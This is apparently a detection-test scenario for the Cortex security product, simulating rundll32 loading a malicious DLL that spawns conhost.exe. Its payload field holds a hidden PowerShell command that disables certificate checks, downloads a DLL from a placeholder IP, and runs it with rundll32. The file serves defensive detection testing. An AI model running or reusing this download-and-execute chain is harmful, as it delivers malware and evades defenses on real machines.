identity.name: Rundll32.exe spawns conhost.exe via malicious DLL
identity.summary: An attacker uses rundll32.exe to execute a malicious DLL that spawns conhost.exe, a behavior often used to evade detection. Cortex should detect this process chain as suspicious.
identity.description: An attacker uses rundll32.exe to execute a malicious DLL that spawns conhost.exe, a behavior often used to evade detection. Cortex should detect this process chain as suspicious.

payload.code:
powershell -nop -w hidden -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object System.Net.WebClient; $client.DownloadFile('http://192.0.2.1/malicious.dll', 'C:\Users\Public\malicious.dll')"
& rundll32.exe C:\Users\Public\malicious.dll,EntryPoint

manual_steps: Not authored. Write and test cleanup before promotion.
